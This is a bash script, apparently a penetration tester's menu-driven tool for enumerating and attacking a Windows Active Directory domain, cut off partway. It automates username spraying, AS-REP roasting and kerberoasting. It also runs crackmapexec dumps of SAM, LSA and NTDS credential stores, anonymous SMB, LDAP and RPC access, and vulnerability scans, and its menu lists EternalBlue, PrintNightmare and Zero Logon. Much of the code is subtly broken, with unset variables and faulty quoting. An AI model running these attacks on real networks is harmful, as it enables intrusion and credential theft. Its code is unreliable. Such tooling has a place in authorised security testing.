#!/bin/bash

#IF UNKNOWN LEAVE BLANK
DOMAINIP="192.168.0.44"
DOMAIN="hatter.local" 
USER="alice"
PASS="P@ssw0rd1"
NTHASH="" #if you have an NT has put here

#Color variables
RED="\e[31m "
GREEN="\e[32m "
YELLOW="\e[33m "
BLUE="\e[34m "
MAGENTA="\e[35m "
CYAN="\e[36m "
RESET="\e[0m "

#Colors
E="echo -e "
R=$E$RED
G=$E$GREEN
Y=$E$YELLOW
B=$E$BLUE
M=$E$MAGENTA
C=$E$CYAN
RE=$E$RESET

$R"   ____  ____________   ______                         ___    ____ ";
$G"  / __ \/ ____/ ____/  / ____/___  __  ______ ___     /   |  / __ \ ";
$Y" / / / / / __/ /      / __/ / __ \/ / / / __ \`__ \   / /| | / / / /";
$B"/ /_/ / /_/ / /___   / /___/ / / / /_/ / / / / / /  / ___ |/ /_/ / ";
$M"\____/\____/\____/  /_____/_/ /_/\__,_/_/ /_/ /_/  /_/  |_/_____/  ";
$C"																	  ";
$RE"                                                                  ";

echo "
D) Download Tools
1) Enumerate System
2) Attack System
3) Priv Esc
99) Exit
"

read -p "Please pick one of the above: " answer


if [ $answer == 99 ]; then
	exit
fi
#Tools Download
if [ $answer == D ]; then
	$G"Updating system to make sure all tools can be found"
	sudo apt update
	$R"Downloading Tools"; $Y
	which rustscan
	if [ $? != 0 ]; then
		URL="https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" 
		wget -c --read-timeout=5 --tries=0 $URL
		sudo dpkg -i rustscan_2.0.1_amd64.deb
	fi
	which bloodhound-python
	if [ $? != 0 ]; then
		pip3 install bloodhound --break-system-packages
	fi
	which enum4linux
	if [ $? != 0 ]; then
		sudo apt install enum4linux
	fi
	which terminator
	if [ $? != 0 ]; then
		sudo apt install terminator
	fi
	which crackmapexec
	if [ $? != 0 ]; then
		pip3 install crackmapexec --break-system-packages
	fi
	which ldapdomaindump
	if [ $? != 0 ]; then
		pip3 install ldapdomaindump --break-system-packages
	fi
	which impacket-GetNPUsers
	if [ $? != 0 ]; then
		sudo apt install impacket-scripts
	fi
	locate kerbrute_linux_amd64
	if [ $? != 0 ]; then
		which go
			if [ $? != 0 ]; then
				sudo apt install golang
			fi
		$R"Making Directory ~/Tools and installing kerbrute"
		mkdir ~/Tools
		git clone https://github.com/ropnop/kerbrute.git ~/Tools
		make all ~/Tools/kerbrute
	fi
	which neo4j
	if [ $? != 0 ]; then
		sudo apt install neo4j
	fi
exit
fi
#Enumeration
if [ $answer == 1 ]; then
	if [ -z "${DOMAINIP}" ]; then
		$R"Need an IP address to attack, please update in script";$RE
		exit
	fi
	
	if [ -z "${DOMAIN}" ]; then
		$R"No Domain Name Entered, please update from below"; $RE
		crackmapexec smb $DOMAINIP -u user -p user
		exit
	fi

	echo "
	1)  RustScan
	2)  NMAP
	3)  Kerberos Username Spray with Kerbrute (Need kerbrute installed, if not installed rerun script and install package)
	4)  GetNPUsers Username Spray to drop crackable hash
	5)  Anonymous login RPC Client
	6)  Anonymous LDAP Domain Dump
	7)  Mount SMB Share with no username / password
	8)  Enum4Linux
	9)  FTP Server anonymous Login
	10) Run some differnet Impacket Enumeartion Scripts
	A)  Auto Enumeration (Let the script run everything)
	T)  Listen to Trapt (You know I had to put some music in here...)
	99) exit
	"
	read -p "Please pick one of the above: " answer
	if [ $answer == 99 ]; then
		exit
	fi

	RUST="rustscan --ulimit 5000 -a $DOMAINIP"
	NMAP="nmap -p 80,8080,8000,443,8443,8433,1337,21,22,23,25,139,445,111,5985,3389,6667,5900,88,389 -vv -T4"
	NP="$DOMAIN/ -no-pass -usersfile $USERSFILE -dc-ip $DOMAINIP"
	RPC="""rpcclient -U "" -N $DOMAINIP"""
	RPCWPASS="rpcclient -U $USER -P $PASS $DOMAINIP"
	RPCCOMMAND="-c enumdomusers,enumdomgroups > RPC.txt"
	LDAPMKDIR="mkdir LDAP"
	LDAP="ldapdomaindump ldap://$DOMAINIP:389"
	LDAPWPASS="ldapdomaindump -u $DOMAIN\\$USER -p $PASS $DOMAINIP"
	SMBMKDIR="mkdir SMB"
	SMB="sudo mount -t cifs //$DOMAINIP/$SMBLOCATION smb"
	SMBWPASS="sudo mount -t cifs -o user=$USER //$DOMAINIP/"
	ENUM4="enum4linux $DOMAINIP"
	FTP="ftp $DOMAINIP"
	IMP="Impacket.txt"
	I=impacket

	if [ $answer == 1 ]; then
		$RUST > $DOMAINIP.txt
	fi
	if [ $answer == 2 ]; then
		$NMAP
	fi
	if [ $answer == 3 ]; then
		$KER
		read -p "Users file, if you do not have one, you can use /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt: " KER_USERS_FILE
		if [ -z {$KER_USERS_FILE} ]; then
			$M"File does not exist, I guess I will do the work for you and find xato-net-10-million-usernames.txt"; $RE
			locate xato-net-10-million-usernames.txt > x.txt
			if [ $? != 0 ]; then
				$C"DAMN DUDE YOU DON'T EVEN HAVE SECLISTS, AGAIN LET ME HELP YOU!!!"
				PWD="pwd > pwd.txt"
				CD=`cat pwd.txt`
				cd /usr/share
				sudo git clone https://github.com/danielmiessler/SecLists.git
				$CD
				echo "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > x.txt"
				X=`cat x.txt`
			fi
		KER="locate kerbrute_linux_amd64 > location.txt"
		LOC=`cat location.txt`
		$LOC userenum $X --dc $DOMAINIP -d $DOMAIN -t 200
		$B"This is going to take a while depending on size of usernames list, make I suggest getting a health snack, like celery, not McDonalds..."; $RE
		$LOC userenum $KER_USERS_FILE --dc $DOMAINIP -d $DOMAIN -t 200
		fi
	fi
	if [ $answer == 4 ]; then
		read -p "Users file for GetNPUsers: " USERSFILE
		$NP
	fi
	if [ $answer == 5 ]; then
		$R"Remember this is enumeration, seeing if RPC is open to no pass / user login. If you want to test for credential login please use the attack method"; $RE
		$RPC
	fi
	if [ $answer == 6 ]; then
		$R"Remember this is enumeration, seeing if LDAP is open to no pass / user login. If you want to test for credential login please use the attack method"
		$G"Making LDAP folder and putting domain information in there"; $R
		$LDAPMKDIR
		$LDAP
		mv domain_*.html LDAP/
		$RE
		read -p "Automatically start firefox with LDAP information that is found (if anonymous login not allow firefox will show a blank page)  (y/n)?: " answer
		if [ $answer == y ]; then
			firefox LDAP/domain_*.html
		fi
	fi
	if [ $answer == 7 ]; then
		smbclient -L "\\\\$DOMAINIP\\"
		read -p "SMBLOCATION: " SMBLOCATION
		$SMBMKDIR		
		$SMB
	fi
	if [ $answer == 8 ]; then
		$ENUM4
	fi
	if [ $answer == 9 ]; then
		$FTP
	fi	
	if [ $answer == 10 ]; then
		$M"Everything is being saved to Impacket.txt"
		$I-samrdump $DOMAIN/ -no-pass -dc-ip $DOMAINIP > $IMP
		$I-GetADUsers $DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP
		$I-rpcdump $DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP
	fi

	if [ $answer == T ]; then
		firefox "https://www.youtube.com/watch?v=P2o57avLBEY&list=RDEMha7hYyaFwNbIbLMLspq3TA&index=2"
	fi
	if [ $answer == "A" ]; then
		ls $DOMAINIP.txt
		if [ $? != 0 ]; then
			$RUST > $DOMAINIP.txt
		fi
		$M"There you go... let it do its thing"; $ER
		if [ $USER ] && [ $PASS ]; then
			$G"Utilizing username $USER and password $PASS to enumerate with"; $RE
			if grep -w 445/tcp $DOMAINIP.txt; then
				$M"Not frozen, running some NMAP Scripts on port 445"; $RE
				nmap -p 445 -sC -sV $DOMAINIP >> $DOMAINIP.txt
				nmap -p 445 --script=smb-vuln* $DOMAINIP >> DOMAINIP.txt 
				$M"Trying to mount SMB to folder SMB"
				$G"When asked for password put in $PASS"; $RE
				smbclient -L "\\\\$DOMAINIP\\"
				read -p "SMBLOCATION: " SMBLOCATION
				$SMBWPASS$SMBLOCATION
			fi
			if grep  -w 389/tcp $DOMAINIP.txt; then
				$G"LDAP Domain Dump"; $RE
				$LDAPMKDIR
				$LDAPWPASS
				mv domain_*.html LDAP/
				read -p "Automatically start firefox with LDAP information that is found (if anonymous login not allow firefox will show a blank page)  (y/n)?: " answer
				if [ $answer == y ]; then
					firefox LDAP/domain_*.html
				fi
			fi
			if grep -w 111/tcp $DOMAINIP.txt; then
				$G"RPC Open, dumping information into RPC.txt if able"; $RE
				$RPCWPASS $RPCCOMMAND
			fi

			read -p "Since you were kind enough to provide a Username and Password would you like to run some impacket magic? (y/n)" impacket
			if [ $impacket == y ]; then
				ls -la $IMP
				if [ $? != 0 ]; then
					touch $IMP
				fi
				$G"Running some different scripts and putting into $IMP"; $RE
				$I-GetUserSPNs "$DOMAIN/$USER:$PASS -dc-ip $DOMAINIP -request >> $IMP"
				$I-lookupsid "$DOMAIN/$USER:$PASS@$DOMAINIP >> $IMP"
				$I-rpcdump "$DOMAIN/$USER:$PASS@$DOMAINIP >> $IMP"
				$I-GetADUsers "$DOMAIN/$USER:$PASS@$DOMAINIP >> $IMP"
			fi
		else
			$G"No Username or Password provided, trying some magic"
			if grep -w 445/tcp $DOMAINIP.txt; then
				nmap -p 445 -sC -sV $DOMAINIP >> $DOMAINIP.txt
				nmap -p 445 --script=smb-vuln* $DOMAINIP >> DOMAINIP.txt 
				$Y"SMB is running"
				smbclient -L "\\\\$DOMAINIP\\"
				$G"If anonymous SMB is not allowed hit enter on the next question, however if allowed we will try and mount to directory SMB"; $RE
				read -p "SMBLOCATION: " SMBLOCATION
				$SMBMKDIR		
				$SMB$SMBLOCATION
			fi
			if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
				$R"Most likley vulnerable to Enternal Blue, can exploit if Attack is used"; $RE
				sleep 10
			fi
			if grep "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103" $DOMAINIP.txt; then
				$R"Most likley vulnerable to MS09-050, can explot if Attack is used"; $RE
				sleep 10
			fi
				$ENUM4
			if grep -w 3389/tcp $DOMAINIP.txt; then
				$G"Looks like RDP was found"; $RE
			fi
			if grep -w 389/tcp $DOMAINIP.txt; then
				$G"LDAP Found"; $RE
				$LDAPMKDIR
				$LDAP
				mv domain_*.html LDAP/
				read -p "Automatically start firefox with LDAP information that is found (if anonymous login not allow firefox will show a blank page)  (y/n)?: " answer
				if [ $answer == y ]; then
					firefox LDAP/domain_*.html
				fi
			fi
			if grep -w 111/tcp $DOMAINIP.txt; then
				ls $IMP
				if [ $? != 0 ]; then
					touch Impacket.txt
				fi
				$G"Trying some Impacket Magic with no pass and saving to $IMP"
				$I-rpcdump "$DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP"
				$I-samrdump "$DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP"
				$I-GetADUsers "$DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP"
			fi
			if grep -w 88/tcp $DOMAINIP.txt; then
				$R"Try to kerberoast? (y/n)?: " answer
				if [ $answer == y ]; then
					$Y"#################### NOTE IF USING XATO 10 MILLION THIS IS GOING TO TAKE A WHILE ######################################"; $RE
					read -p "Users file, if you do not have one, you can use /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt: " KER_USERS_FILE
						if [ -z {$KER_USERS_FILE} ]; then
							$M"File does not exist, I guess I will do the work for you and find xato-net-10-million-usernames.txt"; $RE
							locate xato-net-10-million-usernames.txt > x.txt
							if [ $? != 0 ]; then
								$C"DAMN DUDE YOU DON'T EVEN HAVE SECLISTS, AGAIN LET ME HELP YOU!!!"
								PWD="pwd > pwd.txt"
								CD=`cat pwd.txt`
								cd /usr/share
								sudo git clone https://github.com/danielmiessler/SecLists.git
								$CD
								echo "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > x.txt"
								X=`cat x.txt`
							fi
						KER="locate kerbrute_linux_amd64 > location.txt"
						LOC=`cat location.txt`
						$LOC userenum $X "--dc $DOMAINIP -d $DOMAIN -t 200"
						$B"This is going to take a while depending on size of usernames list, make I suggest getting a healthy snack, like celery, not McDonalds..."; $RE
						$LOC userenum $KER_USERS_FILE "--dc $DOMAINIP -d $DOMAIN -t 200"
						fi
					
				fi
			fi
		fi
	fi
fi

if [ $answer == 2 ]; then

	RUST="rustscan --ulimit 5000 -a $DOMAINIP"
	NMAP="nmap -p 80,8080,8000,443,8443,8433,1337,21,22,23,25,139,445,111,5985,3389,6667,5900,88,389 -vv -T4"
	NP="$DOMAIN/ -no-pass -usersfile $USERSFILE -dc-ip $DOMAINIP"
	RPC="""rpcclient -U "" -N $DOMAINIP"""
	RPCWPASS="rpcclient -U $USER -P $PASS $DOMAINIP"
	RPCCOMMAND="-c enumdomusers,enumdomgroups > RPC.txt"
	LDAPMKDIR="mkdir LDAP"
	LDAP="ldapdomaindump ldap://$DOMAINIP:389"
	LDAPWPASS="ldapdomaindump -u $DOMAIN\\$USER -p $PASS $DOMAINIP"
	SMBMKDIR="mkdir SMB"
	SMB="sudo mount -t cifs //$DOMAINIP/$SMBLOCATION smb"
	SMBWPASS="sudo mount -t cifs -o user=$USER //$DOMAINIP/"
	ENUM4="enum4linux $DOMAINIP"
	FTP="ftp $DOMAINIP"
	CRACKSMB="crackmapexec smb $DOMAINIP -u $USER -p $PASS"
	CRACKLDAP="crackmapexec ldap $DOMAINIP -u $USER -p $PASS "
	IMP="Impacket.txt"
	I=impacket

	$R"Attacking System"; $RE
	if [ -z "${DOMAINIP}" ] || [ -z "${DOMAIN}" ]; then
		$Y"Need an IP address or domain to attack, please update in script";$RE
		exit
	fi
	ls $DOMAINIP.txt
	if [ $? != 0 ]; then
		$G"NMAP / RustScan was never ran, running now"; $RE
		$RUST > $DOMAINIP.txt
	fi

	echo "
	1)  CrackMapExec (Runs different crackmapexec tools)
	2)  SMBKiller (Runs SMBKiller Script which is for retrieving a NTLM hash from an SMB file)
	3)  SMB Attacks (Runs different attacks such as Eternal Blue and MS09-050)
	4)  Impacket Tools (Will run different impacket scripts)
	5)  Bloodhound (Run bloodhound-python on the target machine)
	6)  LDAP Domain Dump with Username and Password
	7)  Mount SMB with Username and Password
	8)  Mount FTP with Username and Password
	9)  Create .lnk to retrieve NTLM hashes from SMB Server
	10) Print Nightmare
	11) Zero Logon
	A)  Auto Attack (Let the script do its thing)
	T)  Listen to Tool (You know I had to put some music in here...)
	99) exit
	"
	read -p "Please pick one of the above: " answer
	if [ $answer == 99 ]; then
		exit
	fi
	if [ $answer == 1 ]; then
		$R"Running some CrackMapExec stuff, saving to $IMP"; $RE
		ls $IMP
		if [ $? != 0 ]; then
			touch impacket.txt
		fi
		$G"Running against SMB"; $RE
		$CRACKSMB --shares >> $IMP
		$CRACKSMB --sessions >> $IMP
		$CRACKSMB --disks >> $IMP
		$CRACKSMB --loggedon-users >> $IMP
		$CRACKSMB --users >> $IMP
		$CRACKSMB --groups >> $IMP
		$CRACKSMB --computers >> $IMP
		$CRACKSMB --sam >> $IMP
		$CRACKSMB --lsa >> $IMP
		$CRACKSMB --ntds >> $IMP
		$C"Running against LDAP"; $RE
		$CRACKLDAP --asreproast >> $IMP
		$CRACKLDAP --kerberoasting >> $IMP
		$CRACKLDAP --trusted-for-delegation >> $IMP
		$CRACKLDAP --password-not-required >> $IMP
		$CRACKLDAP --admin-count >> $IMP
		$CRACKLDAP --users >> $IMP
		$CRACKLDAP --groups >> $IMP


	if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
		$R""; $RE
		sleep 10
	fi
	if grep "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103" $DOMAINIP.txt; then
		$R"Most likley vulnerable to MS09-050, can explot if Attack is used"; $RE
		sleep 10
	fi
	if [ $answer == A ]; then


###################################### LEAVE CRACK MAP EXEC AT THE BOTTOM OR IT WILL MESS WITH STUFF ##################################################################


		if [ $? != 0 ]; then
			touch impacket.txt
		fi
		$CRACKSMB --shares >> $IMP
		$CRACKSMB --sessions >> $IMP
		$CRACKSMB --disks >> $IMP
		$CRACKSMB --loggedon-users >> $IMP
		$CRACKSMB --users >> $IMP
		$CRACKSMB --groups >> $IMP
		$CRACKSMB --computers >> $IMP
		$CRACKSMB --sam >> $IMP
		$CRACKSMB --lsa >> $IMP
		$CRACKSMB --ntds >> $IMP
		$CRACKLDAP --asreproast >> $IMP
		$CRACKLDAP --kerberoasting >> $IMP
		$CRACKLDAP --trusted-for-delegation >> $IMP
		$CRACKLDAP --password-not-required >> $IMP
		$CRACKLDAP --admin-count >> $IMP
		$CRACKLDAP --users >> $IMP
		$CRACKLDAP --groups >> $IMP
